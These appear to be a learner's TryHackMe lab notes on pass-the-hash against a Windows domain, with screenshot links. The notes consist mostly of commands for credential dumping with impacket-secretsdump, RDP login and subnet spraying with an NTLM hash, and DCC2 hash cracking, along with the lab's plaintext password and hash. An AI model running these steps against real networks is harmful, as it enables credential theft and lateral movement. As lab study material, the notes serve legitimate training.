# Using PtH(Pass the Hash)

(Phase 1 — Validate Access)

crackmapexec smb 10.200.74.249 -u t2_felicia.dean -p 'iLov3THM!' -d ZA.TRYHACKME

PHASE 2 — Dump Credentials (No Mimikatz, Kali-only)

┌──(root㉿kali)-[/home/kali]
└─# impacket-secretsdump [za.tryhackme.com/t2_felicia.dean:'iLov3THM!'@10.200.74.249](http://za.tryhackme.com/t2_felicia.dean:'iLov3THM!'@10.200.74.249)

![Screenshot From 2026-07-18 03-08-59.png](Using%20PtH(Pass%20the%20Hash)/Screenshot_From_2026-07-18_03-08-59.png)

Using NTLM hash

impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0b2571be7e75e3dbd169ca5352a2dad7 [Administrator@10.200.74.249](mailto:Administrator@10.200.74.249)

*Connect to RDP using PtH:*

```bash
xfreerdp3 /v:10.200.74.249 /u:Administrator /pth:0b2571be7e75e3dbd169ca5352a2dad7 /cert:ignore /sec:nla +restricted-admin
```

![Screenshot From 2026-07-18 03-13-38-1.png](Using%20PtH(Pass%20the%20Hash)/Screenshot_From_2026-07-18_03-13-38-1.png)

1. Scan Subnet with NTLM Hash

crackmapexec smb 10.200.74.0/24 -u Administrator -H 0b2571be7e75e3dbd169ca5352a2dad7 --local-auth

![Screenshot From 2026-07-18 03-18-57-1.png](Using%20PtH(Pass%20the%20Hash)/Screenshot_From_2026-07-18_03-18-57-1.png)

PHASE 7 — Crack Cached Domain Hashes (DCC2)

hashcat -m 2100 dcc2_hashes.txt rockyou.txt

Then reuse cracked creds:

crackmapexec smb 10.200.74.0/24 -u crackeduser -p crackedpass -d ZA.tryhackme.com

![Screenshot From 2026-07-18 03-27-05.png](Using%20PtH(Pass%20the%20Hash)/Screenshot_From_2026-07-18_03-27-05.png)

PHASE 8 — Domain Controller Dump (If Privileged)

![Screenshot From 2026-07-18 03-30-21.png](Using%20PtH(Pass%20the%20Hash)/Screenshot_From_2026-07-18_03-30-21.png)